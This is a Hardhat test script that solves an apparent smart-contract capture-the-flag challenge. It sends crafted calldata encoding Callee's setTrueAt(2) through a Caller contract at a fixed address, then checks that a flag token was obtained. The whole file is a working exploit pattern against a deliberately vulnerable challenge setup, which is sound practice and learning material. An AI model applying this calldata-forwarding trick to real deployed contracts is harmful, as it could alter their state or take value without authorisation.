const { assert, expect } = require("chai");
const { ethers } = require("hardhat");

describe("Capture The Flag", function () {
  let signer0;
  let caller, callee, flag;
  beforeEach(async () => {
    flag = await ethers.getContractAt("BlueFlag", "0x3C60519F734E0Bc7dba0e2ad30D372D0a9E8aE03");

    callee = await ethers.getContractAt("Callee", "0x0BE703643eBD49eA61b3b2F1858bB8936FC40981");
    
    caller = await ethers.getContractAt("Caller", "0xFb9AF15E418DDcF1B4653b334090332dE6917E28");
  });

  it("should capture", async function () {
    signer0 = await ethers.provider.getSigner(0);
    await signer0.sendTransaction({
      to: caller.address,
      data: callee.interface.encodeFunctionData("setTrueAt", [2])
    });

    const balance = await flag.balanceOf(await signer0.getAddress());
    assert.isAbove(balance.toNumber(), 0);
  });
});
